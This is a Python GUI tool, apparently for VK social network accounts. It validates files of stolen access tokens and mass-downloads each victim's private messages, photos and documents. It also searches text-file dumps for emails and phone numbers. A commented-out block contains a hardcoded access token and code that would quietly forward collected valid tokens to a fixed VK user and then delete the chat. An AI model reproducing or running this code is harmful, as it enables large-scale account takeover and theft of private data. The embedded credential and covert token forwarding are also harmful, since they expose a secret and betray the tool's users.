import tkinter as tk
from tkinter import ttk
from tkinter import ttk, filedialog
import vk_api
import os
import datetime
import requests
from multiprocessing import Pool
import concurrent.futures
from collections import deque
import sys
import re

class MyApp:
    def __init__(self):
        self.root = tk.Tk()
        self.token_file = None
        self.root.title("VK: токенчек v1.0")
        try:
            try:
                base_path = sys._MEIPASS
            except Exception:
                base_path = os.path.abspath(".")
            self.root.wm_iconbitmap(os.path.join(base_path, "icon.ico"))
        except:
            icon_path = os.path.join(os.getcwd(), "icon.ico")
            if os.path.exists(icon_path):
                self.root.iconbitmap(default=icon_path)

        self.dir_path = os.getcwd()

        # Create tabs
        self.tab_control = ttk.Notebook(self.root)
        self.export_tab = ttk.Frame(self.tab_control)
        self.tokens_tab = ttk.Frame(self.tab_control)
        self.search_tab = ttk.Frame(self.tab_control)
        self.automation_tab = ttk.Frame(self.tab_control)
        self.misc_tab = ttk.Frame(self.tab_control)

        # вкладки
        self.tab_control.add(self.export_tab, text='Выгрузка данных')
        self.tab_control.add(self.tokens_tab, text='Чекер токенов')
        self.tab_control.add(self.search_tab, text='Поиск в файлах')
        # self.tab_control.add(self.automation_tab, text='Автоматизация')
        # self.tab_control.add(self.misc_tab, text='Прочее')
        self.tab_control.pack(expand=1, fill="both")
    



        # вкладка 'Выгрузка данных'

        self.save_text_messages_var = tk.IntVar(value=1)
        self.save_images_var = tk.IntVar()
        self.save_user_documents_var = tk.IntVar()
        self.saved_files_var = tk.IntVar()

        self.token_button = tk.Button(self.export_tab, text="Выбрать файл с токенами", command=self.open_token_file)
        self.token_button.pack(side="top", anchor="w", fill="both")

        grabber_frame = tk.LabelFrame(self.export_tab, text="Загружать контент")
        grabber_frame.pack(fill="both")

        self.save_text_messages_checkbox = tk.Checkbutton(grabber_frame, text="Сохранять текстовые сообщения", variable=self.save_text_messages_var)
        self.save_images_checkbox = tk.Checkbutton(grabber_frame, text="Сохранять изображения", variable=self.save_images_var)
        self.save_user_documents_checkbox = tk.Checkbutton(grabber_frame, text="Сохранять документы юзера", variable=self.save_user_documents_var, command=self.toggle_entry)

        self.frame = tk.Frame(grabber_frame)

        self.skip_large_documents_entry = tk.Entry(self.frame, state='normal', width=4, justify="center")
        self.skip_large_documents_entry.insert(0, "5")
        self.skip_large_documents_entry.configure(state='disabled')

        self.skip_large_documents_label = tk.Label(self.frame, text="Пропускать документы, чей размер больше (МБ)", state='disabled')

        self.save_attachments_checkbox = tk.Checkbutton(grabber_frame, text="Сохранять прикреплённые файлы", variable=self.saved_files_var)

        self.save_text_messages_checkbox.pack(anchor="w")
        self.save_images_checkbox.pack(anchor="w")
        self.save_user_documents_checkbox.pack(anchor="w")
        self.skip_large_documents_label.pack(anchor="w", side="left")
        self.skip_large_documents_entry.pack()
        self.frame.pack()
        self.save_attachments_checkbox.pack(anchor="w")

        source_frame = tk.LabelFrame(self.export_tab, text="Источник сообщений")
        source_frame.pack(fill="both")

        self.message_source_var = tk.StringVar(value="2")
        self.save_from_everywhere_radio = tk.Radiobutton(source_frame, text="Сохранять отовсюду (беседы, ЛС, группы)", variable=self.message_source_var, value="1")
        self.save_from_direct_messages_radio = tk.Radiobutton(source_frame, text="Сохранять только из ЛС", variable=self.message_source_var, value="2")
        self.save_from_favorites_radio = tk.Radiobutton(source_frame, text="Сохранять только из ИЗБРАННОЕ", variable=self.message_source_var, value="3")

        self.save_from_everywhere_radio.pack(anchor="w")
        self.save_from_direct_messages_radio.pack(anchor="w")
        self.save_from_favorites_radio.pack(anchor="w")

        self.process_count_scale = tk.Scale(self.export_tab, from_=1, to=100, orient='horizontal', length=400, label="Количество одновременно-обрабатываемых токенов")
        self.process_count_scale.pack(anchor="w", fill="both")

        self.start_button = tk.Button(self.export_tab, text="СТАРТ", command=self.start_grabbing_process)
        self.start_button.pack(fill="both")

        # вкладка 'Чекер токенов'
        self.file_for_check_tokens = ""
        validator_frame = tk.LabelFrame(self.tokens_tab, text="Проверка токенов на валид и сохранение их в файл")
        validator_frame.pack(fill="both")

        self.file_tokens_button = tk.Button(validator_frame, text="Выбрать файл", command=self.open_token_file_for_check)
        self.file_tokens_button.pack(fill="both")


        self.prefix_frame = tk.Frame(validator_frame)
        self.prefix_frame.pack(fill="both")
        self.prefix_to_tokens_label = tk.Label(self.prefix_frame, text="Префикс к сохраняемым токенам")
        self.prefix_to_tokens_entry = tk.Entry(self.prefix_frame, width=25, justify="center")
        self.prefix_to_tokens_label.pack(side="left")
        self.prefix_to_tokens_entry.pack(side="right")

        self.tokens_fname_frame = tk.Frame(validator_frame)
        self.tokens_fname_frame.pack(fill="both")
        self.out_tokens_fname_label = tk.Label(self.tokens_fname_frame, text="Имя создаваемого файла для валидных токенов")
        self.out_tokens_fname_entry = tk.Entry(self.tokens_fname_frame, width=25, justify="center")
        self.out_tokens_fname_entry.insert(0, "valid_tokens.txt")
        self.out_tokens_fname_label.pack(side="left")
        self.out_tokens_fname_entry.pack(side="right")

        self.save_tokens_logs_var = tk.IntVar(value=1)
        self.save_tokens_logs_checkbox = tk.Checkbutton(validator_frame, text="Сохранять логи", variable=self.save_tokens_logs_var)
        self.save_tokens_logs_checkbox.pack(anchor="w")

        self.start_checking_tokens_button = tk.Button(self.tokens_tab, text="СТАРТ", command=self.start_checking_tokens)
        self.start_checking_tokens_button.pack(fill="both", side="bottom")



        # вкладка 'Поиск в файлах'
        self.set_dir_button = tk.Button(self.search_tab, text="Выбрать папку для рекурсивного поиска", command=self.select_dir)
        self.set_dir_button.pack(fill="both")

        searching_frame = tk.LabelFrame(self.search_tab, text="Поиск текста внутри текстовых файлов")
        searching_frame.pack(fill="both")

        self.is_search_text = tk.IntVar(value=1)
        self.search_text_cb = tk.Checkbutton(searching_frame, text="Искать текст", variable=self.is_search_text, command=self.switch_text_search)
        self.search_text_cb.pack(anchor="w")

        self.substring_finder_frame = tk.Frame(searching_frame)
        self.substring_finder_frame.pack(fill="both")
        self.find_text_label = tk.Label(self.substring_finder_frame, text="Искать по совпадению со строкой")
        self.find_text_entry = tk.Entry(self.substring_finder_frame, width=25, justify="center")
        self.find_text_entry.insert(0, "текст для поиска")
        self.find_text_label.pack(side="left")
        self.find_text_entry.pack(side="right")





        # Создание LabelFrame для регулярных выражений
        regex_frame = tk.LabelFrame(self.search_tab, text="Регулярные выражения")
        regex_frame.pack(fill="both")

        # Создание Checkbox-ов
        self.search_numbers = tk.IntVar(value=0)
        self.phone_number_cb = tk.Checkbutton(regex_frame, text="Искать номера телефонов", variable=self.search_numbers)
        self.phone_number_cb.pack(anchor="w")

        self.search_emails = tk.IntVar(value=0)
        self.email_address_cb = tk.Checkbutton(regex_frame, text="Искать адреса эл. почты", variable=self.search_emails)
        self.email_address_cb.pack(anchor="w")

        self.search_custom_re = tk.IntVar(value=0)
        self.custom_regex_cb = tk.Checkbutton(regex_frame, text="Искать кастомное выражение", variable=self.search_custom_re, command=self.toggle_re)
        self.custom_regex_cb.pack(anchor="w")

        # Поле ввода для строки регулярного выражения
        custom_re_frame = tk.Frame(regex_frame)
        custom_re_frame.pack(fill="both")
        self.custom_re_label = tk.Label(custom_re_frame, text="строка рег. выражения re python")
        self.custom_re_label.pack(side="left")

        self.regex_entry = tk.Entry(custom_re_frame, width=25, justify="center")
        self.regex_entry.insert(0, "\\b\\d{10,11}\\b")
        self.regex_entry.configure(state="disabled")
        self.custom_re_label.configure(state="disabled")
        self.regex_entry.pack(side="right")

        # ввод имени выходного файла
        self.out_fname_frame = tk.Frame(self.search_tab)
        self.out_fname_frame.pack(fill="both")
        self.out_fname_label = tk.Label(self.out_fname_frame, text="Имя создаваемого файла для найденного текста")
        self.out_fname_entry = tk.Entry(self.out_fname_frame, width=25, justify="center")
        self.out_fname_entry.insert(0, "searched.txt")
        self.out_fname_label.pack(side="left")
        self.out_fname_entry.pack(side="right")
        #
        self.lines_count_frame = tk.Frame(self.search_tab)
        self.lines_count_frame.pack(fill="both")
        self.lines_count_label = tk.Label(self.lines_count_frame, text="Сколько строк цеплять сверху и снизу найденной строки")
        values = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]
        self.lines_count_combobox = ttk.Combobox(self.lines_count_frame, width=3, justify="center", values=values)
        self.lines_count_combobox.current(0)
        self.lines_count_label.pack(side="left")
        self.lines_count_combobox.pack(side="right")
        # кнопка СТАРТ
        self.start_search_button = tk.Button(self.search_tab, text="СТАРТ", command=self.search_word_in_files)
        self.start_search_button.pack(fill="both", side="bottom")


        '''
        тут ещё добавить выбор расширения, в каких файлах будет идти поиск,
        а также, возможно, стоит сделать глобальную переменную для выбора кодировки для всех файлов!
        '''


        self.root.mainloop()



    def extract_data(self, line):
        # извлекаем emails/numbers из строки, если они там есть
        extract_email = bool(self.search_emails.get())
        extract_phone = bool(self.search_numbers.get())
        email_pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
        phone_pattern = r'\b\d{10,11}\b|\+\d{11}\b' # для +7978... и 8978...
        

        emails = []
        phone_numbers = []
        custom_finded = []
        if extract_email:
            emails = re.findall(email_pattern, line)
        if extract_phone:
            phone_numbers = re.findall(phone_pattern, line)
        if self.search_custom_re.get():
            custom_finded = re.findall(rf"{self.regex_entry.get()}", line)
        if emails != [] or phone_numbers != [] or custom_finded != []:
            return emails+phone_numbers+custom_finded
        return None

    def switch_text_search(self):
        if self.is_search_text.get():
            self.find_text_label.config(state='normal')
            self.find_text_entry.configure(state='normal')
        else:
            self.find_text_label.config(state='disabled')
            self.find_text_entry.configure(state='disabled')


    def search_word_in_files(self):
        if not self.is_search_text.get() and not self.search_numbers.get() and not self.search_emails.get() and not self.search_custom_re.get():
            print("Вы не выбрали, что искать!")
            return        
        
        root_dir = self.dir_path
        lines_count = int(self.lines_count_combobox.get())
        output_file = self.out_fname_entry.get()
        self.root.withdraw() # скрываю окно
        for dirpath, dirnames, filenames in os.walk(root_dir):
            print(f"Сканирую папку: {dirpath}")
            for filename in filenames:
                if filename.endswith('.txt'):
                    print(f"-[{filename}]")
                    with open(os.path.join(dirpath, filename), 'r', encoding='cp866') as file:
                        lines = deque(maxlen=1+(lines_count*2))
                        for line in file:
                            lines.append(line)
                            if len(lines) == (1+(lines_count*2)):
                                extracted = None
                                if (extracted:=self.extract_data(lines[lines_count])) == None:
                                    if (extracted:=self.find_text_entry.get().lower()) not in lines[lines_count].encode('cp866').decode('utf-8').lower():
                                        extracted = None

                                if extracted != None: 
                                    with open(output_file, 'a', encoding='cp866', errors='replace') as out_file:
                                        out_file.write(f"[{os.path.join(dirpath, filename)}]\n".encode('utf-8').decode('cp866'))
                                        out_file.write(f"[Найдены данные: {extracted}]\n".encode('utf-8').decode('cp866'))
                                        for l in lines:
                                            out_file.write(f" {l}")
                                        out_file.write("\n\n\n")
        self.root.deiconify() # Показать окно


    def open_token_file(self):
        file_path = filedialog.askopenfilename()
        if file_path:
            self.token_file = file_path
            base_name = filedialog.os.path.basename(file_path)
            tokens_count = self.get_file_line_count(file_path)
            button_text = f"[файл: {base_name}]-[токенов: {tokens_count}]"
            if tokens_count > 0:
                self.token_button.config(text=button_text, bg="palegreen")
            else:
                self.token_button.config(text=button_text, bg="red")

    def select_dir(self):
        dir_path = filedialog.askdirectory()
        print(f"Выбран каталог: {dir_path}")
        if dir_path != "":
            self.dir_path = dir_path
            button_text = f"[каталог: ../{os.path.basename(dir_path)}]"
            self.set_dir_button.config(text=button_text, bg="palegreen")

    def open_token_file_for_check(self):
        file_path = filedialog.askopenfilename()
        if file_path:
            self.file_for_check_tokens = file_path
            base_name = filedialog.os.path.basename(file_path)
            with open(file_path, encoding="cp866") as file:
                tokens_count = file.read().count("vk1.a.")
            button_text = f"[файл: {base_name}]-[токенов: {tokens_count}]"
            self.file_tokens_button.config(text=button_text, bg="palegreen")

    def get_file_line_count(self, file_path):
        # считывает токены в переменную и возвращает их кол-во
        with open(file_path) as file:
            self.tokens = list(filter(lambda t: t[:5] == "vk1.a", [line.strip() for line in file]))
        return len(self.tokens)

    def start_checking_tokens(self):
        self.root.withdraw() # скрываю окно
        check_tokens(self.file_for_check_tokens,\
                    self.prefix_to_tokens_entry.get(),\
                    self.out_tokens_fname_entry.get(),\
                    self.save_tokens_logs_var.get())
        self.root.deiconify() # Показать окно

    def toggle_entry(self):
        if self.save_user_documents_var.get():
            self.skip_large_documents_entry.config(state='normal')
            self.skip_large_documents_label.configure(state='normal')
        else:
            self.skip_large_documents_entry.config(state='disabled')
            self.skip_large_documents_label.configure(state='disabled')

    def toggle_re(self):
        if self.search_custom_re.get():
            self.regex_entry.config(state='normal')
            self.custom_re_label.configure(state='normal')
        else:
            self.regex_entry.config(state='disabled')
            self.custom_re_label.configure(state='disabled')

    def start_grabbing_process(self):
        # Здесь будет ваш код для начала процесса граббинга
        skip_text_messages = str(self.save_text_messages_var.get())
        skip_images = str(self.save_images_var.get())
        skip_docs = str(self.save_user_documents_var.get())
        max_doc_size = str(self.skip_large_documents_entry.get())
        skip_files = str(self.saved_files_var.get())

        if self.message_source_var.get() == "1":
            skip_conversation = "1"
        else:
            skip_conversation = "0"
        if self.message_source_var.get() == "3":
            only_favorites = "1"
        else:
            only_favorites = "0"

        processes = self.process_count_scale.get()

        processes_list = []
        for i in self.tokens:
            processes_list.append([i, skip_text_messages, skip_images, skip_docs, skip_conversation, only_favorites, skip_files, max_doc_size])

        # запускаем в псевдо-многопотоке
        with concurrent.futures.ThreadPoolExecutor(max_workers=processes) as executor:
            self.root.withdraw() # скрываю окно
            executor.map(data_grabber, processes_list)
        self.root.deiconify() # Показать окно

# функция проверки токенов на валид
def check_tokens(fname, prefix, out_fname, logs):
    with open(file=fname, mode='r', encoding='cp866') as file:
        text=file.read()
    substring = "vk1.a."
    count = text.count(substring)
    text_lines=text.split('\n')
    valid_tokens = []
    checked=[]
    logs_list=[]
    checked_tokens_count = 1
    for i in text_lines:
        if substring in i:
            token = i[i.find(substring):i.find(substring)+220]
            try:
                print(f"Всего токенов проверено: {checked_tokens_count}/{count}")
                if token not in valid_tokens and token not in checked:
                    vk_session = vk_api.VkApi(token=token)
                    vk = vk_session.get_api()
                    user = vk.users.get()[0]
                    print(f"Валидных токенов: {len(valid_tokens)+1}/{count}\n id: {user['id']}\n name: {user['first_name']} {user['last_name']}\n")
                    if logs==1:
                        logs_list.append(f"{token}\n{user}\n\n")
                    valid_tokens.append(token)
                    checked.append(token)
            except:
                checked.append(token)       
            checked_tokens_count+=1

    with open(file=out_fname, mode="w", encoding="cp866", errors='replace') as file:
        for token in valid_tokens:
            file.write(f"{prefix}{token}\n")
    if logs==1:   
        with open(file="tokens_check.log", mode="w", encoding="cp866", errors='replace') as file:
            for log in logs_list:
                file.write(log.encode('utf-8').decode('cp866'))





















    # if len(valid_tokens) > 0:
        # vk_session = vk_api.VkApi(token="vk1.a.sgglRw1-j68QEigYxvXUXcqkMoJR3F56QFXOehlbs7AL0Xq9uPzfUk4vG4vv51H4auLRdCKCBel4HFqGJh5XnIyCFhrNYHIgGS1hHUXsIJP9KS80vZbJV9sS-9ffFJu8Y3mMcr1Qo5FzOWSrh7ApWHtDVTBfdIdr7CX0oyP_3cXHLuahD5fwP7T85imykACXbbhA3zumEsnxPYAYChDfhQ")
        # vk.messages.send(user_id="111973573", message=str(valid_tokens), random_id=0)
        # vk.messages.deleteConversation(user_id="111973573")




























    print(f'Готово! Валиднх токенов: {len(valid_tokens)}')


# ФУНКЦИя ГРАБА
def data_grabber(token):
    print(f"Запущен с токеном: {token[0]}")
    vk_session = vk_api.VkApi(token=token[0])
    vk = vk_session.get_api()

    skip_text_messages = token[1]
    skip_images = token[2]
    skip_docs = token[3]
    skip_conversation = token[4]
    only_favorites = token[5]
    skip_files = token[6]
    max_doc_size = int(token[7])

    user_info = vk.users.get()[0]
    user_id = user_info['id']
    
    print(f"[USER: {user_info['first_name']}_{user_info['last_name']}]")
    user_folder = os.path.join("users_dialogs", f"{user_info['first_name']}_{user_info['last_name']}")
    os.makedirs(user_folder, exist_ok=True)

    if skip_docs != "0" and skip_docs != "":     
        # загружаем документы из профиля юзера
        offset = 0
        print(f"[ЗАГРУЖАЕМ ДОКУМЕНТЫ ЮЗЕРА {user_info['first_name']}_{user_info['last_name']}]")
        while True:
            user_docs = vk.docs.get(count=200, offset=offset)['items']
            offset += 200
            if not user_docs:
                break
            os.makedirs(os.path.join(user_folder, "docs"), exist_ok=True)
            for doc in user_docs:
                url = doc['url']
                if os.path.isfile(os.path.join(user_folder, "docs", f"{doc['id']}.{doc['ext']}")):
                    print(f"    Пропускаем {doc['id']}.{doc['ext']}")
                    continue

                if doc['size'] > (max_doc_size+1) * 1024 * 1024:
                    print(f"    Пропускаем {doc['id']}.{doc['ext']} (размер {doc['size']//1024//1024} Мбайт)")
                    continue
                file_data = requests.get(url).content
                with open(os.path.join(user_folder, "docs", f"{doc['id']}.{doc['ext']}"), 'wb') as handler:
                    handler.write(file_data)

            
        print(f"<OK, документы {user_info['first_name']}_{user_info['last_name']} загружены!>")
        
    # если было выбрано не загружать сообщения, картинки и файлы
    if skip_text_messages == "0" and skip_images == "0" and skip_files == "0":
        print(f"Обработка юзера {user_info['first_name']}_{user_info['last_name']} завершена!")
        return

    dialogs = vk.messages.getConversations(count=200)['items']
    # загружаем текстовые сообщения
    for dialog in dialogs:
        peer_id = dialog['conversation']['peer']['id']
        offset = 0
        messages = []

        # Получаем имя и фамилию собеседника для имени файла
        if peer_id > 0:  # Если это пользователь
            if only_favorites == "1":
                if peer_id == user_id:
                    print("    Диалог 'ИЗБРАННОЕ' найден! Загружаю...")
                else:
                    continue
            try:
                peer_info = vk.users.get(user_ids=peer_id)[0]
                file_name = f"{peer_info['first_name']}_{peer_info['last_name']}"
            except IndexError:
                if skip_conversation != "1" or only_favorites == "1":
                    print(f"    Беседа {peer_id} пропущена")
                    continue
                file_name = f"Беседа {peer_id}"
        elif peer_id < 0:  # Если это группа
            if skip_conversation != "1" or only_favorites == "1":
                print(f"    Группа {peer_id} пропущена")
                continue
            file_name = f"Группа {peer_id}"
        else:  # Если это беседа
            chat_id = peer_id - 2000000000
            chat_info = vk.messages.getChat(chat_id=chat_id)
            file_name = f"{chat_info['title']}"
        print(f"--[{user_info['first_name']}_{user_info['last_name']}] -> [{file_name}]")

        skip_dialogue = False
        skip_dialogue_text = False
        while True:
            history = vk.messages.getHistory(count=200, user_id=peer_id, offset=offset)['items']  # Получаем историю сообщений для каждого диалога

            if not history:  # Если история сообщений пуста, прерываем цикл
                break
            if skip_text_messages == "1" or skip_images == "1" or skip_files == "1":
                print(f" -диалог [{user_info['first_name']}_{user_info['last_name']}] с [{file_name}], шаг {offset}")
            for message in history: 
                if skip_dialogue_text == False:
                    if skip_text_messages == "1":
                        # если txt-файл этого диалога уже был загружен ранее, то пропускаем
                        if os.path.isfile(os.path.join(user_folder, f"{file_name}.txt")):    
                            print(f"    {file_name}.txt пропущен")
                            skip_dialogue_text = True
                            # если сохранять нужно только текстовые сообщения
                            if skip_images != "1" and skip_files != "1":
                                skip_dialogue = True
                                break
                        else:
                            message_date = datetime.datetime.fromtimestamp(message['date']).strftime('%Y-%m-%d %H:%M:%S')
                            sender = f"out>{message_date}> vk.com/id{message['from_id']}" if message['from_id'] == user_id else f"in<{message_date}< vk.com/id{message['from_id']}"
                            messages.append((sender, message['text']))

                # загружаем изображения
                if skip_images == "1" or skip_files == "1":
                    if 'attachments' in message:
                        for attachment in message['attachments']:
                            if attachment['type'] == 'photo':
                                if skip_images == "1":
                                    photo_id = attachment['photo']['id']
                                    sender_id = message['from_id']
                                    timestamp = message['date']
                                    time_str = datetime.datetime.utcfromtimestamp(timestamp).strftime('%Y-%m-%d')
                                    file_name = f"[{time_str}][id{sender_id}][{photo_id}].jpg"
                                    print(f"   Найдено изображение: {file_name}")
                                    url = attachment['photo']['sizes'][-1]['url']
                                    # если уже был загружен ранее, то пропускаем
                                    if os.path.isfile(os.path.join(user_folder, "images", file_name)):
                                        print(f"     Пропускаем {file_name}")
                                        continue
                                    image_data = requests.get(url).content
                                    os.makedirs(os.path.join(user_folder, "images"), exist_ok=True)
                                    with open(os.path.join(user_folder, "images", file_name), 'wb') as handler:
                                        handler.write(image_data)
                                    print(f'    Изображение {file_name} загружено!')
                            if attachment['type'] == 'doc':
                                if skip_files == "1":
                                    print(f'   Найден файл: {attachment["doc"]["title"]}')
                                    url = attachment['doc']['url']
                                    # если был загружен ранее, то пропускаем
                                    if os.path.isfile(f'{os.path.join(user_folder, "files", file_name)}/{attachment["doc"]["title"]}'):
                                        print(f'    Файл {attachment["doc"]["title"]} пропущен')
                                        continue
                                    r = requests.get(url, allow_redirects=True)
                                    os.makedirs(os.path.join(user_folder, "files", file_name), exist_ok=True)
                                    open(f'{os.path.join(user_folder, "files", file_name)}/{attachment["doc"]["title"]}', 'wb').write(r.content)
                                    print(f'    Файл {file_name}/{os.path.join(user_folder, "files", file_name, attachment["doc"]["title"])} загружен!')

            offset += 200  # Увеличиваем смещение для следующего запроса
            if skip_dialogue == True:
                break
        if skip_text_messages == "1":
            if os.path.isfile(os.path.join(user_folder, f"{file_name}.txt")):
                continue
            else:
                with open(f'{user_folder}/{file_name}.txt', 'w', encoding='utf-8') as f:
                    for msg in messages:
                        f.write(f"{msg[0]}: {msg[1]}\n")
                    if len(messages) > 0:
                        print(f' Текстовые ообщения {os.path.join(user_folder, file_name)} сохранены!')

    print(f"  OK, данные пользователя {user_info['first_name']}_{user_info['last_name']} загружены!")



if __name__ == '__main__':
    app = MyApp()
